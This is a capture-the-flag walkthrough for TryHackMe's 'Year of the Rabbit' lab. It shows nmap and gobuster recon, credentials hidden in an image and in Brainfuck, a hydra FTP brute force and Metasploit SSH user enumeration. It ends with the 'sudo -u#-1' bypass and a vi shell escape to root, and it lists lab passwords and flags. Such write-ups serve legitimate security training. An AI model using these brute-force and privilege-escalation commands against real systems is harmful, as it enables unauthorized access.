# Year of the Rabbit

Another set of ctf notes.
Run from tryhackme's attackbox.

attacker IP: 10.10.159.20

target IP: 10.10.138.209


## recon

There are so many RickRolls in this one...

### nmap 

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-24 22:21 BST
Nmap scan report for ip-10-10-138-209.eu-west-1.compute.internal (10.10.138.209)
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (EdDSA)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:6C:26:AD:B9:5B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=7/24%OT=21%CT=1%CU=36029%PV=Y%DS=1%DC=D%G=Y%M=026C26%T
OS:M=64BEEB6C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%TS=8
OS:)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms ip-10-10-138-209.eu-west-1.compute.internal (10.10.138.209)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
```

### gobuster

```
/assets (Status: 301)
/server-status (Status: 403)
```

### website

http://10.10.138.209/assets/style.css

```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

http://10.10.138.209/sup3r_s3cr3t_fl4g.php redirects to youtube...

**redirections are worth looking into**

Intercept with burpsuite:
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.138.209
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

http://10.10.138.209/WExYY2Cv-qU/


http://10.10.138.209/WExYY2Cv-qU/Hot_Babe.png Download the image and run 

`root@ip-10-10-159-20:~/Downloads# strings Hot_Babe.png`

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

## gaining access
### ftp

Copy potential passwords into `ftplist.txt`

`root@ip-10-10-159-20:~# hydra -vv -l ftpuser -P ftplist.txt 10.10.138.209 ftp`

```
[21][ftp] host: 10.10.138.209   login: ftpuser   password: 5iez1wGXKfPKQ
```

`ftp> get Eli's_Creds.txt`

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

https://sange.fi/esoteric/brainfuck/impl/interp/i.html

```
User: eli

Password: DSpDiM1wAEwid
```
### ssh

I started user enumeration earlier and it also found `eli`.


`msf6 auxiliary(scanner/ssh/ssh_enumusers) > run`

```
[*] 10.10.138.209:22 - SSH - Using malformed packet technique
[*] 10.10.138.209:22 - SSH - Starting scan
[+] 10.10.138.209:22 - SSH - User 'mail' found
[+] 10.10.138.209:22 - SSH - User 'root' found
[+] 10.10.138.209:22 - SSH - User 'news' found
[+] 10.10.138.209:22 - SSH - User 'man' found
[+] 10.10.138.209:22 - SSH - User 'bin' found
[+] 10.10.138.209:22 - SSH - User 'games' found
[+] 10.10.138.209:22 - SSH - User 'nobody' found
[+] 10.10.138.209:22 - SSH - User 'backup' found
[+] 10.10.138.209:22 - SSH - User 'daemon' found
[+] 10.10.138.209:22 - SSH - User 'proxy' found
[+] 10.10.138.209:22 - SSH - User 'list' found
[+] 10.10.138.209:22 - SSH - User 'eli' found
[+] 10.10.138.209:22 - SSH - User 'sys' found
[+] 10.10.138.209:22 - SSH - User 'pulse' found


```

`root@ip-10-10-159-20:~# ssh eli@10.10.138.209`

## escalation
### escalation to gwendoline

```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

`eli@year-of-the-rabbit:/home/gwendoline$ locate s3cr3t`

```
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```

`eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! `

```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

`eli@year-of-the-rabbit:/home$ su gwendoline`

**THM{1107174691af9ff3681d2b5bdb5740b1589bae53}**

### escalation to root

```
Linux year-of-the-rabbit 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux
```

```
Sudo version 1.8.10p3
```


`gwendoline@year-of-the-rabbit:~$ sudo -l`

```
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

`gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi /home/gwendoline/user.txt `

```
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/user.txt' as root on year-of-the-rabbit.
```


This exploit didn't work, but the comments did explain how to get root manually using `sudo -u#-1`.
https://www.exploit-db.com/exploits/47502


`gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

`:!/bin/sh`

which gives us root.

**THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}**



